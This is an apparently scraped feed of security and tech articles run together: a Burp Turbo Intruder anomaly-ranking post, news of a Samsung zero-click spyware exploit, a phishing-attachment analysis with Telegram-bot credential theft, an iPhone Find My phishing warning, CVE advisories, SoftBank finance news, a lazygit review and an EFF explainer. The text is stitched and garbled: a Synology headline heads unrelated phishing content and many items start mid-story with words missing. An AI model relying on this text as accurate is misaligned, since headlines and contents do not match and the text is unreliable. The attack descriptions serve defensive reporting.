**Published:** 11 November 2025 at 14:41 UTC

**Updated:** 11 November 2025 at 14:41 UTC

If you've ever used Burp Intruder or Turbo Intruder, you'll be familiar with the ritual of manually digging through thousands of responses by repeatedly sorting the table via length, status code, etc. I've developed an algorithm called HTTP Anomaly Rank which can efficiently pick out the most interesting responses for you.

HTTP Anomaly Rank is now integrated into Turbo Intruder and automatically places the most anomalous findings at the top of the results table without you needing to lift a finger.

We've also integrated this algorithm into Burp Suite's API in release 2025.10, so you can easily use it in your own tools. Since it can efficiently sift through massive result sets, it's particularly useful for anyone who wants to build AI based features.

In this post I'll explain how the algorithm works in depth but first, here's a quick demo:

HTTP Anomaly Rank evolved from the diffing logic I developed during my Backslash Powered Scanner: Automating Human Intuition research back in 2016. I built Backslash Powered Scanner to discover unknown injection vulnerability classes by recognising subtle differences in responses to payload pairs such as " vs ". Accurately diffing HTTP responses is a notoriously difficult problem as they're often very noisy, but I eventually found a reliable approach based on calculating a large number of response attributes (think status code, line count, exact byte sequence...), identifying which ones are stable, and using these for response comparison. This let me answer the question "Are the responses to these two payloads consistently different", and automate discovery of some really nice vulnerabilities. Check out the whitepaper and presentation for the full details.

HTTP Anomaly Rank scores every response based on how different it is from the others. First, it calculates a weight for every attribute based on how stable it is.

PayloadStatusContent-TypeWord-countCRC32administrator403text/html812d753916dadmin403text/html8125129f3bdsales503text/html97710639dbaccounting200text/html8123978f20fADMIN403text/html8119fa1cbc1root503text/html9727df2486test403text/html812e45449e7

For example, consider the response set above.

The algorithm then looks at every response, and assigns it a score based on how unique the attribute values seen on that response are, combined with how unique it is. In this example, ADMIN ends up with the highest score because it has a unique word-count.

This approach means it can detect and flag responses with tiny discrepancies, even when the overall response content is very noisy - check the video above for an example.

The score increases in accuracy as we collect more responses. The calculation is quite computationally heavy but the algorithmic complexity is O(N) so it scales well. In Turbo Intruder, I made the score only get calculated when the attack is completed to minimise wasted CPU cycles.

Part of my vision for Turbo Intruder is to require as few user clicks as possible. To help achieve this, it will now automatically sort the results table by the anomaly rank column when the attack completes. Hopefully this strategy works for you but if not, you can override it and automatically sort by any column of your choice using table.setSortOrder()

I'm looking forward to announcing some more quality of life updates for Turbo Intruder soon!

If you see the "Anomaly Rank" column but it's always set to 0, that means you need to update Burp Suite. This feature is available in 2025.10 and later.

Let me know how you find it, and if you'd like this feature in Burp Intruder too.

Enjoy!]]></content:encoded></item><item><title>Patch now: Samsung zero-day lets attackers take over your phone</title><link>https://www.malwarebytes.com/blog/news/2025/11/patch-now-samsung-zero-day-lets-attackers-take-over-your-phone</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 14:28:04 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[So, for many cybersecurity professionals, CISA adding this vulnerability to the list signals both urgency and confirmation of active, real-world exploitation.CVE-2025-21042 was reportedly exploited as a remote code execution (RCE) zero-day to deploy LANDFALL spyware on Galaxy devices in the Middle East. But once that happens, other criminals tend to quickly follow with similar attacks.The flaw itself is an out-of-bounds write vulnerability in Samsung’s image processing library. These vulnerabilities let attackers overwrite memory beyond what is intended, often leading to memory corruption, unauthorized code execution, and, as in this case, device takeover. CVE-2025-21042 allows remote attackers to execute arbitrary code—potentially gaining complete control over the victim’s phone—without user interaction. No clicks required. No warning given.Samsung patched this issue in April 2025, but CISA’s recent warning highlights that exploits have been active in the wild for months, with attackers outpacing defenders in some cases. The stakes are high: data theft, surveillance, and compromised mobile devices being used as footholds for broader enterprise attacks.​The exploitation playbook is as clever as it is dangerous. According to research from Unit 42, criminals (likely private-sector offensive actors operating out of the Middle East) weaponized the vulnerability to deliver LANDFALL spyware through malformed Digital Negative (DNG) image files sent via WhatsApp. DNG is an open and lossless RAW image format developed by Adobe and used by digital photographers to store uncompressed sensor data.The attack chain works like this:The victim receives a booby-trapped DNG photo file.The file, armed with ZIP archive payloads and tailored exploit code, triggers the vulnerability in Samsung’s image codec library.This is a “zero-click” attack: the user doesn’t have to tap, open, or execute anything. Just processing the image is enough to compromise the device.It’s important to know that Samsung addressed another image-library flaw, CVE-2025-21043, in September 2025, showing a growing trend: image processing flaws are becoming a favorite entry point for both espionage and cybercrime.What should users and businesses do?Our advice to stay safe from this type of attack is simple:If you haven’t updated your Samsung device since April, do so. FCEB organizations have until December 1, 2025, to comply with CISA’s operational directive.Be wary of unsolicited messages and files, especially images received over messaging apps.Download apps only from trusted sources and avoid sideloading files.Zero-days targeting mobile devices are becoming frighteningly common, but the risk can be lowered with urgent patching, awareness, and solid security controls. As LANDFALL shows, the most dangerous attacks today are often the quietest—no user action required and no obvious signs until it’s too late.Device models targeted by LANDFALL:We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Synology BeeStation 0-Day Vulnerability Let Remote Attackers Execute Arbitrary Code</title><link>https://cybersecuritynews.com/synology-beestation-0-day-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 11 Nov 2025 14:20:06 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Synology BeeStation 0-Day Vulnerability Let Remote Attackers Execute Arbitrary Code

Even though this is a script-kiddie-level type of attack, we figured it was worth writing up—precisely because it’s so easy to follow what they’re up to.The email is direct and to the point. Not a lot of social engineering happening here.Pls kindly find the attached PO please send us PI once its available.”The sender’s address belongs to a Czechoslovakian printing service (likely compromised), and the name and phone number are fake. The target is in Taiwan.The attached  file is a tidy fake login screen that doesn’t really specify which credentials they want:The pre-filled email address in the screenshot is a fake one I added; normally it would be the target’s email.We assume the phisher welcomes any credentials entered here, and are counting on the fact that most people reuse passwords on other sites. Under the hood, the functionality of this attachment lies in this piece of JavaScript.It starts with simple checks to make sure all the fields are filled out and long enough before declaring the Telegram bot that will receive the login details.Using Telegram bots provides the phishers with several advantages:Stolen credentials are delivered instantly to the attacker via Telegram notifications. No need for the phisher to keep checking a database or inbox.Telegram is a legitimate, globally distributed messaging service, making it difficult to block.There’s no exposed web server or obvious phishing “drop site” that can be blocklisted or shut down.The last line contains a credibility trick:setTimeout(() => {window.location.assign("file:///C:/Users/USER/Downloads/Invoice_FAC_0031.pdf")}, 2000);This tries to open a file on the user’s computer after waiting 2 seconds (2,000 milliseconds). Since this file almost certainly doesn’t exist, the browser will either block the action (especially from an email or non-local file) or show an error. Either way, it will make the login attempt look more legitimate and take the user’s mind off the fact that they just sent their credentials who knows where.That’s really all there is to it, except for a bit of code that the dungeon-dweller forgot to remove during their copy-and-paste coding. Or they had no idea what it was for and left it in place for fear of breaking something.I suspect the attacker originally used this code to encrypt the credentials with a hardcoded AES (Advanced Encryption Standard) key and injection vector, then send them to their server.This attacker replaced that method with the simpler Telegram bot approach (much easier to use), but left the decryption stub because they were afraid removing it would break something.Don’t fall for phishing attemptsEven though the sophistication level of this email was low, that does not reduce the possible impact of sending the attacker your credentials.In phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsCheck if the website address in the browser matches the domain you expect to be on (e.g. adobe.com).Other important tips to stay safe from phishing in general:Verify the sender: Always check if the sender’s email address matches what you would expect it to be. It’s not always conclusive but it can help you spot some attempts.Check through an independent channel if the sender actually sent you an attachment or a link.Keep your device and all its software updated.Use multi-factor authentication for every account you can.Use a password manager. Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.If you already entered credentials on a page you don’t trust, change your passwords immediately. You can also upload screenshots of suspicious emails to Malwarebytes Scam Guard. It would have recognized this one as a phishing attempt.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit.

Without your passcode, fingerprint or face to unlock it, it would be useless to anyone else. Now, though, some phone thieves have found a workaround, not by breaking Apple’s security, but by tricking owners into giving them the keys. The Swiss National Cyber Security Centre (NCSC) has issued a warning about phishing scams targeting iPhone owners who’ve lost their devices.Phishing for Apple ID credentialsWhen you report an iPhone as lost in Apple’s  app, you can set a custom lock-screen message that appears on the missing device. Many people include an email address or phone number in that message so a helpful stranger can contact them if the phone turns up.Unfortunately, that’s the very information scammers use to reach you. A thief (or anyone who now has the phone) can see that contact detail on the screen and send you a convincing message—usually by text, iMessage, or email—claiming to have found your device.The scam messages often include details copied from the phone itself, such as its model and color, to make it sound authentic. It also includes a link to a fake website that mimics the Find My service that Apple operates to locate lost devices. The site will ask for the victim’s Apple ID credentials.If the victim takes the bait, the thief can use those credentials to gain full access to the phone. That enables them to wipe it, returning it to factory settings for resale.Although the NCSC didn’t say so, an enterprising thief could get up to all kinds of other shenanigans. They might reset the user’s Apple ID to lock them out—even on a replacement device, access their photos (yes, including any risqué ones), read their emails and nose through their apps. In short, it would give them carte blanche to your digital life.These attacks don’t have to happen immediately. The perpetrators might text months after the device has been lost, when victims might have moved on and lowered their guard.The good news… and the badThe warning is both good and bad news. It’s good news because it shows that criminals are apparently unable to bypass Apple’s Activation Lock protection through technical means. The Activation Lock, turned on when you activate Find My, registers a device ID on Apple’s activation servers. Even if the criminals reset your device, the activation lock will still be there. Only someone with the user’s Apple ID credentials can unlock it. It’s a version of something called Factory Reset Protection (FRP) that the US mandated under the US Smart Phone Theft Prevention Act of 2015. Android phones have similar lock functionality.The warning is bad news because phone owners are human, and humans are often the easiest security system to defeat. Phishing schemes that target phone theft victims are big business. Back in 2017, security reporter Brian Krebs documented “phishing as a service” platforms that did it at scale, on a subscription basis. Vice found toolkits like ProKit for phishing to unlock phones on sale for around $75.We’ve already written about how the phone theft industry operates. Police in the UK recently uncovered a network stealing up to 40,000 phones per year. Most were shipped overseas to countries including China, where they would be used as profitably as possible. Locked phones might be broken up for parts, but a phone restored to factory settings that can be activated from scratch is far more valuable.What to do if your iPhone is stolenIgnore any messages from “Apple” claiming your lost phone has been found. The NCSC says Apple will never text or email customers about a recovered device.If you lose your phone,  right away in to lock it and display your contact message. Use a different contact number or email (not the one linked to your Apple ID or main phone) so scammers can’t use that information to target you.Protect your SIM, too: enable  immediately, and ask your carrier to  if the phone has been stolen.We can’t easily stop thieves stealing people’s phones, or control who sees our phones after they leave our hands. But a little forethought now can help you to stop criminals from accessing your digital life or selling your phone on in its current form if it does enter the underground supply chain.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

The Blocksy Companion plugin for WordPress is vulnerable to authenticated arbitrary file upload in all versions up to, and including, 2.1.19. This is due to insufficient file type validation detecting SVG files, allowing double extension files to bypass sanitization while being accepted as a valid SVG file. This makes it possible for authenticated attackers, with author level access and above, to upload arbitrary files on the affected site's server which may make remote code execution possible.

The TNC Toolbox: Web Performance plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 1.4.2. This is due to the plugin storing cPanel API credentials (hostname, username, and API key) in files within the web-accessible wp-content directory without adequate protection in the "Tnc_Wp_Toolbox_Settings::save_settings" function. This makes it possible for unauthenticated attackers to retrieve these credentials and use them to interact with the cPanel API, which can lead to arbitrary file uploads, remote code execution, and full compromise of the hosting environment.

It also disclosed that it sold part of its T-Mobile stake for $9.17 billion."We want to provide a lot of investment opportunities for investors, while we can still maintain financial strength," said SoftBank's chief financial officer, Yoshimitsu Goto, during an investor presentation."So through those options and tools we make sure that we are ready for funding in a very safe manner," he said in comments translated by the company, adding that the stake sales were part of the firm's strategy for "asset monetization."Nvidia shares dipped 2% on Tuesday.The sale of Nvidia shares, partial sale of T-Mobile shares and the margin loan on SoftBank's holding in , are all "sources of cash that will be used to fund the $22.5 billion investment in OpenAI," a person familiar with the matter told CNBC. They added that this cash will fund other projects the firm is working on such as its acquisition of 's robotics unit.The offloading of the Nvidia stake had nothing to do with concerns about artificial intelligence valuations, the person said.While the Nvidia exit may come as a surprise to some investors, it's not the first time SoftBank has cashed out of the American AI chip darling.SoftBank's Vision Fund was an early backer of Nvidia, reportedly amassing a $4 billion stake in 2017 before selling all of its holdings in January 2019. Despite its latest sale, SoftBank's business interests remain heavily intertwined with Nvidia's.The Tokyo-based company is involved in a number of AI ventures that rely on Nvidia's technology, including the $500 billion Stargate project for data centers in the U.S."This should not be seen, in our view, as a cautious or negative stance on Nvidia, but rather in the context of SoftBank needing at least $30.5bn of capital for investments in the Oct-Dec quarter, including $22.5bn for OpenAI and $6.5bn for Ampere," Rolf Bulk, equity research analyst at New Street Research, told CNBC.That amounts to "more in a single quarter than it has invested in aggregate over the two prior years combined," Bulk said.Morningstar's Dan Baker added that he doesn't see the move as representing a fundamental shift in strategy for the company."[SoftBank] made a point of saying that it wasn't any view on NVIDIA. ... At the end of the day, they are using the money to invest in other AI related companies," he said.Vision fund posts blowout $19 billion gainThe stake sales and a blowout gain of $19 billion from SoftBank's Vision Fund helped the company double its profit in its fiscal second quarter.The Vision Fund has been aggressively pushing into artificial intelligence, investing and acquiring firms throughout the AI value chain from chips to large language models and robotics."The reason we were able to have this result is because of September last year, that was the first time we invested in OpenAI," said SoftBank's Goto. He added that OpenAI's latest valuation milestone of $500 billion marks one of the largest valuations in the world, according to fair value.Following the recapitalization and SoftBank's $22.5 billion investment into the ChatGPT maker, the Japanese firm's 4% ownership of OpenAI will increase to 11%.SoftBank could "potentially" increase its investment in OpenAI further depending on the performance of the ChatGPT maker and the valuation of further rounds, the person familiar with the matter told CNBC.Generally, SoftBank wouldn't want to go beyond a 40% equity ownership that would amount to a controlling stake, they said.The Japanese conglomerate's stock has slumped in the past week as concerns of an AI bubble sent jitters through global markets."Our share price recently has been going up and down dynamically … we want to provide as many invest opportunities as possible," said Goto on Tuesday, adding that the company's announced four-for-one stock split is part of its strategy to provide as many investment opportunities for shareholders as possible.]]></content:encoded></item><item><title>CVE-2025-10714 - AXIS Optimizer Windows Unquoted Search Path Privilege Escalation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10714</link><author></author><category>vulns</category><pubDate>Tue, 11 Nov 2025 07:16:05 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10714

TorrentPier is an open source BitTorrent Public/Private tracker engine, written in php. In versions up to and including 2.8.8, an authenticated SQL injection vulnerability exists in the moderator control panel (`modcp.php`). Users with moderator permissions can exploit this vulnerability by supplying a malicious `topic_id` (`t`) parameter. This allows an authenticated moderator to execute arbitrary SQL queries, leading to the potential disclosure, modification, or deletion of any data in the database. Although it requires moderator privileges, it is still severe. A malicious or compromised moderator account can leverage this vulnerability to read, modify, or delete data. A patch is available at commit 6a0f6499d89fa5d6e2afa8ee53802a1ad11ece80.

Pdfminer.six is a community maintained fork of the original PDFMiner, a tool for extracting information from PDF documents. Prior to version 20251107, pdfminer.six will execute arbitrary code from a malicious pickle file if provided with a malicious PDF file. The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed. Version 20251107 fixes the issue.

Milvus is an open-source vector database built for generative AI applications. An unauthenticated attacker can exploit a vulnerability in versions prior to 2.4.24, 2.5.21, and 2.6.5 to bypass all authentication mechanisms in the Milvus Proxy component, gaining full administrative access to the Milvus cluster. This grants the attacker the ability to read, modify, or delete data, and to perform privileged administrative operations such as database or collection management. This issue has been fixed in Milvus 2.4.24, 2.5.21, and 2.6.5. If immediate upgrade is not possible, a temporary mitigation can be applied by removing the sourceID header from all incoming requests at the gateway, API gateway, or load balancer level before they reach the Milvus Proxy. This prevents attackers from exploiting the authentication bypass behavior.

Incus is a system container and virtual machine manager. An issue in versions prior to 6.0.6 and 6.19.0 affects any Incus user in an environment where an unprivileged user may have root access to a container with an attached custom storage volume that has the `security.shifted` property set to `true` as well as access to the host as an unprivileged user. The most common case for this would be systems using `incus-user` with the less privileged `incus` group to provide unprivileged users with an isolated restricted access to Incus. Such users may be able to create a custom storage volume with the necessary property (depending on kernel and filesystem support) and can then write a setuid binary from within the container which can be executed as an unprivileged user on the host to gain root privileges. A patch for this issue is expected in versions 6.0.6 and 6.19.0. As a workaround, permissions can be manually restricted until a patched version of Incus is deployed.

 Nov. 10, 2025, 10:15 p.m. | 13 hours, 57 minutes ago
OAuth2-Proxy is an open-source tool that can act as either a standalone reverse proxy or a middleware component integrated into existing reverse proxy or load balancer setups. In versions prior to 7.13.0, all deployments of OAuth2 Proxy in front of applications that normalize underscores to dashes in HTTP headers (e.g., WSGI-based frameworks such as Django, Flask, FastAPI, and PHP applications). Authenticated users can inject underscore variants of X-Forwarded-* headers that bypass the proxy’s filtering logic, potentially escalating privileges in the upstream app. OAuth2 Proxy authentication/authorization itself is not compromised. The problem has been patched with v7.13.0. By default all specified headers will now be normalized, meaning that both capitalization and the use of underscores (_) versus dashes (-) will be ignored when matching headers to be stripped. For example, both `X-Forwarded-For` and `X_Forwarded-for` will now be treated as equivalent and stripped away. For those who have a rational that requires keeping a similar looking header and not stripping it, the maintainers introduced a new configuration field for Headers managed through the AlphaConfig called `InsecureSkipHeaderNormalization`. As a workaround, ensure filtering and processing logic in upstream services don't treat underscores and hyphens in Headers the same way.

As you can imagine, with two kids, life quickly verified this plan 🙃. I did eventually start  projects. One of the goals (sounding rebellious in the current AI hype cycle) was to learn and use neovim
for coding. As a Goland
aficionado, I (and my wrist) have always been tempted by no-mouse, OSS, gopls
based, highly configurable dev setups.Long story short, I’d still stick to Goland for my professional coding (for now), but during the experiments with , I accidentally stumbled upon lazygit
Git UI. I literally mistyped  instead of , which opened up the built-in  overlay UI.A week later, I have already switched all my  workflows to  (also outside ), and I have been using it since then. In this post, I’d like to explain why it happened so quickly, so:What makes  so special?How can it make you more productive?What we can all learn from  around designing incredible software with seamless UX?Likely every developer knows and (in some form) uses the git CLI
. It’s relatively simple, and it seems incredibly stable – the only change I noticed in the last decade was the new  command, although I still haven’t “switched” to it from the lovely 🙃 .Some of them offer more or less the same  workflows as the original  CLI, just more visually appealing and with buttons/interactivity instead of remembering the CLI flags, e.g. git gui
, GitHub Desktop
or  discussed here.Other projects add more magic (e.g. AI), and potentially new light abstractions/workflows in an attempt to simplify or enhance  use e.g. GitKraken
.There are even projects like recently popular jj
tool that completely abstracts away  API and replace it with a new source control flows to “simplify” them or unify them across various VCS
other than  (e.g. , Google Piper
and everything else you wished it was , but it’s not 😛).What you choose for your work is entirely up to you. Depending on what you are passionate about, how you work with  and what type of software you are touching (monorepo vs small repos, closed vs open source, GitHub vs other hosting solutions, where you deploy, etc.), different clients might be more or less productive for you.For me, I need something:simple and fast to limit the context switch overhead. CLI-native to have fewer things that can go wrong.“discoverable” and interactive, as I am bad at remembering keybindings and commands (I need my brain memory for more fun bits).For those reasons, early in my career, I started depending on a hybrid workflow, with a few GUI tools:git gui
instead of , , ,  and . CLI for everything else (e.g. rebasing/complex merging).I don’t remember why specifically those (AFAIK, decade ago there wasn’t anything else), but I literally have been using them non-stop until this year!A few years ago, because of the 1990-style look of those UIs, lack of active development and modern features, I looked around for some alternatives. I remember I was quickly demotivated when I accidentally lost all my local changes on a single mouse click on the wrong thing in one of the tools 🙈 (starts with  and ends with ). After that, I was sceptical I’d find some new tool anytime soon. The arguments to motivate me to make a switch would need to be strong.Turns out, an open mind and a bit of curiosity in a random moment gave more fruit than tailored research. By accident, I noticed  and after a short try, it became my main  tool.What’s amazing in ?Somehow, lazygit
ticked so many boxes for me:It’s easy to use; it makes you productive from day 1.It enables you to do more (and faster), even teaching you along the way.It’s a TUI (terminal user interface), making it incredibly fast, portable and visually consistent.Many of the tool’s benefits are also amazing learning on how to build brilliant devtools and software in general.Personally, probably the best thing about the  is its UX, notably how easy it is to use this tool, with just a basic understanding of the  CLI. Generally, it seems that a nice user experience is achieved due to deliberate choice of strong consistency, deliberate visualizations and interactive menus. Let me explain. is incredibly well organized and visually consistent.  TUI consists of a set of boxes (“views”) with consistent behaviour. Most views are generally visible, always, no matter what operation you are doing (unless you zoom in). You always have a focus on one box. It’s visibly clear that some boxes have “tabs”. When you interact with boxes on the left, the right box changes.Then,  generally sticks to native  terms and abstractions, which reduces the initial learning curve. In fact, this tool even teaches you about standard, yet a bit more advanced  operations (e.g.  which I used to do manually) and terms (e.g. TIL 
which is an official  term for a piece of relevant code).Finally, by default,  is pretty consistent with the feeling and keybindings of . This means that  will quit the tool,  (or arrows) are for navigation,  for filtering and  for copy. Then, similar to  it attempts to follow the name of the command, e.g.  commits,  adds all,  amends,  fetches,  pulls,  pushes,  rebases.This is incredibly important as your common workflows can be easily memorized and invoked in a quick set of a few keystrokes (see enhanced workflows
). Now, as I mentioned before, that’s a double-edged sword, because if your brain is lazy like mine, you will end up staring at the  view trying to remember what the command was to select and copy things (or quit vim
). strikes an amazing balance of showing data you need when you need it. When you open this tool, it’s obvious you want to do some  trickery, so it’s likely a good thing to give you all you need to know, in a pill:All staged and unstaged files with changes ().The top ~10 commits on this branch.Last git commands you performed.Core actions/commands you can do with their keybindings.It’s a lot of data! Yet  somehow manages to show you all of this without visually overwhelming you:Consistent and self-explanatory views with a flat action menu allow you to find the data you need when you need it quickly.This context is game-changing:If you never used this tool, or if you had spent one month doing meetings, reviews and design docs at work, and you return to coding finally, you immediately know  and .It reduces the risk of surprises and mistakes ("ups! I pushed to main directly sorry!"), saving you a solid amount of  (software engineering hours) monthly.Normally to double-check those things you would need to run multiple commands and check different windows.  immediately removes that context switching.Even if you forget important keybindings for actions, it’s quick to check them on the footer or with .But there’s more,  guides you on all operations with interactivity.In other UI tools, you have hundreds of buttons, with multiple layers of nested menus.  has a different approach. This tool teaches you on the way, what’s possible and when. For example:Push will give you a warning of divergence with upstream if any. Clicking  will do  push,  will cancel.Rebase will ask you, if you want the interactive one or not and double-check the branch.Interactive rebase is much more guided and interactive, than . No need to manually type and remember special words (e.g.  or ). The ,  keys also quickly move commits up and down (reordering).Git conflicts after rebase will be highlighted. After you fix them  automatically will ask you if you want to commit them and auto continue the rebase.When switching branches with conflicting changes,  will automatically ask you if you want to auto-stash those changes etc.Generally,  guides you in your workflows with minimal distractions and guesswork. This builds trust very quickly, allowing adoption of faster workflows.Eventually,  boosted productivity around git workflows for me and for many other existing happy users.What’s impressive is that  does it without adding entirely new workflows. Instead, it makes what  CLI offers much more usable, safer, quicker and discoverable. It teaches you better patterns.One example is highlighted with custom patching. Imagine you made some changes, committed them, but then you want to bring back a few lines (but not all) to what it was before, from an earlier commit. My previous flow used to be either:Local IDE history (slow-ish, too much granularity (every file save), not always available). tool I clicked  which would pull all changed files from that commit to  area, then I find lines I want, manually copy them (with those git diff  and  chars!) and paste to IDE, then trim unwanted chars. Pretty horrible habit (:When using , I obviously tried to replicate my broken workflow. I couldn’t because  diffs are not intuitively select+copy-able (it might be fixable over time; not the highest priority, but people want this e.g. 1
, 2
). I even +1 one some issue around it
, and I’m glad I did, because the maintainer pointed me to… 10x simpler workflow: native reset/patch per line/hunk flow!All git diffs in  (no matter if unstaged/staged/stashed/committed changes) support per line or hunk selection and patching/selection.With this, my “line reset from the last commit” workflow is:works for any commit (not only the latest)Steps in : focus on commits view > select commit > select file > select lines to reset > patch options > “remove patch from the original commit”. All either mouse-assisted or 4 enter enter space <c-p> d within seconds.Those short key bindings are game changers in general. I’d recommend starting with a slower, but careful mouse-assisted flow, then naturally you memorize the needed keystrokes without noticing. For me, after some time, some quick flows became a habit, I was using shortcuts unconsciously.As a result, my common  flows, with , were significantly improved:Iterating on changes and updating upstream:My typical flow to ensure clean commit log:select files to commit > add to the last commit (amend) > force pushselect files to commit > create new commit > push2 space c <type commit title> PI generally do an interactive rebase for this. I avoid merges, unless squashed.select branch > rebase > interactive rebase > arrange commits > rebase options > continue3 r i <s/p/d/.. to arrange rebase> m cRemoving unwanted commit from historyNormally you would need to do full interactive rebase against  or something, but now:select commit > select file > removeThis is normally a bit painful, but now:select commit > select file > select lines or hunks > patch options > move patch into new commit after the original commit > create new commit4 enter enter <c-p> n <type commit title> enterTypically, it meant copying commit SHAs around; prone to errors. Now:select branch > select commit > copy for cherry-pick (you can buffer many) > select target branch > go to commits > pasteImagine what other tools we could write, reusing similar patterns or even similar UX! TUI framework
and  code is fully OSS (MIT)
, so anyone has a healthy base for building different tools. I do have ideas for a few tools, especially around some extremely manual release workflows in our ecosystems. Let’s collaborate! 💪Hope this write-up was useful for you!Even with the current advancement in GenAI, statistical aspect of LLMs makes them not a great fit for reliable and accurate version control changes that projects and systems have to rely on. Some LLM assist (e.g. generating commit messages)
will eventually come to  and git tooling, but the core of  is to remain incredibly relevant for the (increasingly AI-assisted) software development cycles.Feel free to comment, give feedback AND use and contribute to the  project!

In short, yes. There are a variety of US federal and state laws which give law enforcement powers to obtain information that you provided to online services. But, there are steps you as a user and/or as a service provider can take to improve online privacy.Law enforcement demanding access to your private online data goes back to the beginning of the internet. In fact, one of  EFF’s first cases, Steve Jackson Games v. Secret Service, exemplified the now all-too-familiar story where unfounded claims about illegal behavior resulted in overbroad seizures of user messages. But it’s not the ’90s anymore, the internet has become an integral part of everyone’s life. Everyone now relies on organizations big and small to steward our data, from huge service providers like Google, Meta, or your ISP, to hobbyists hosting a blog or Mastodon server. There is no “cloud,” just someone else's computer—and when the cops come knocking on their door, these hosts need to be willing to stand up for privacy, and know how to do so to the fullest extent under the law. These legal limits are also important for users to know, not only to mitigate risks in their security plan when choosing where to share data, but to understand whether these hosts are going to bat for them. Taking action together, service hosts and users can curb law enforcement getting more data than they’re allowed, protecting not just themselves but targeted populations, present and future.This is distinct from law enforcement’s methods of collecting  data, such as the information now being collected on student visa applicants. Cops may use social media monitoring tools and sock puppet accounts to collect what you share publicly, or even within “private” communities. Police may also obtain the contents of communication in other ways that do not require court authorization, such as monitoring network traffic passively to catch metadata and possibly using advanced tools to partially reveal encrypted information. They can even outright buy information from online data brokers. Unfortunately there are few restrictions or oversight for these practices—something EFF is fighting to change.Below however is a general breakdown of the legal processes used by US law enforcement for accessing  data, and what categories of private data these processes can disclose. Because this is a generalized summary, it is neither exhaustive nor should be considered legal advice. Please seek legal help if you have specific data privacy and security needs.Challenge prior to disclosure? to an investigationNon-content information, Court order; sometimes subpoenaSpecific and articulable facts that info is relevant to an investigation that info will provide evidence of a crimeProbable cause  and Types of Data that Can be CollectedThe laws protecting private data online generally follow a pattern: the more sensitive the personal data is, the greater factual and legal burden police have to meet before they can obtain it. Although this is not exhaustive, here are a few categories of data you may be sharing with services, and why police might want to obtain it. Information you provide in order to use the service. Think about ID or payment information, IP address location, email, phone number, and other information you provided when signing up. Law enforcement can learn who controls an anonymous account, and find other service providers to gather information from.Non-content data, or "metadata": This is saved information about your interactions on the service; like when you used the service, for how long, and with whom. Analogous to what a postal worker can infer from a sealed letter with addressing information.Law enforcement can use this information to infer a social graph, login history, and other information about a suspect’s behavior. This is the actual content you are sending and receiving, like your direct message history or saved drafts. This can cover any private information your service provider can access. This most sensitive data is collected to reveal criminal evidence. Overly broad requests also allow for retroactive searches, information on other users, and can take information out of its original context.  This is the content of your communications as it is being communicated. This real-time access may also collect info which isn’t typically stored by a provider, like your voice during a phone call.Law enforcement can compel providers to wiretap their own services for a particular user—which may also implicate the privacy of users they interact with.Legal Processes Used to Get Your DataWhen US law enforcement has identified a service that likely has this data, they have a few tools to legally compel that service to hand it over and prevent users from knowing information is being collected.Subpoenas are demands from a prosecutor, law enforcement, or a grand jury which do not require approval of a judge before being sent to a service. The only restriction is this demand be relevant to an investigation. Often the only time a court reviews a subpoena is when a service or user challenges it in court.Due to the lack of direct court oversight in most cases, subpoenas are prone to abuse and overreach. Providers should scrutinize such requests carefully with a lawyer and push back before disclosure, particularly when law enforcement tries to use subpoenas to obtain more private data, such as the contents of communications.This is a similar demand to subpoenas, but usually pertains to a specific statute which requires a court to authorize the demand. Under the Stored Communications Act, for example, a court can issue an order for non-content information if police provide specific facts that the information being sought is relevant to an investigation. Like subpoenas, providers can usually challenge court orders before disclosure and inform the user(s) of the request, subject to law enforcement obtaining a gag order (more on this below). A warrant is a demand issued by a judge to permit police to search specific places or persons. To obtain a warrant, police must submit an affidavit (a written statement made under oath) establishing that there is a fair probability (or “probable cause”) that evidence of a crime will be found at a particular place or on a particular person. Typically services cannot challenge a warrant before disclosure, as these requests are already approved by a magistrate. Sometimes police request that judges also enter gag orders against the target of the warrant that prevent hosts from informing the public or the user that the warrant exists.Police seeking to intercept communications as they occur generally face the highest legal burden. Usually the affidavit needs to not only establish probable cause, but also make clear that other investigation methods are not viable (exhaustion) and that the collection avoids capturing irrelevant data (minimization). Some laws also require high-level approval within law enforcement, such as leadership, to approve the request. Some laws also limit the types of crimes that law enforcement may use wiretaps in while they are investigating. The laws may also require law enforcement to periodically report back to the court about the wiretap, including whether they are minimizing collection of non-relevant communications. Generally these demands cannot be challenged while wiretapping is occurring, and providers are prohibited from telling the targets about the wiretap. But some laws require disclosure to targets and those who were communicating with them after the wiretap has ended. Many of the legal authorities described above also permit law enforcement to simultaneously prohibit the service from telling the target of the legal process or the general public that the surveillance is occurring. These non-disclosure orders are prone to abuse and EFF has repeatedly fought them because they violate the First Amendment and prohibit public understanding about the breadth of law enforcement surveillance.How Services Can (and Should) Protect YouThis process isn't always clean-cut, and service providers must ultimately comply with lawful demands for user’s data, even when they challenge them and courts uphold the government’s demands. Service providers outside the US also aren’t totally in the clear, as they must often comply with US law enforcement demands. This is usually because they either have a legal presence in the US or because they can be compelled through mutual legal assistance treaties and other international legal mechanisms. However, services can do a lot by following a few best practices to defend user privacy, thus limiting the impact of these requests and in some cases make their service a less appealing door for the cops to knock on.Paramount is the service provider's willingness to stand up for their users. Carving out exceptions or volunteering information outside of the legal framework erodes everyone's right to privacy. Even in extenuating and urgent circumstances, the responsibility is not on you to decide 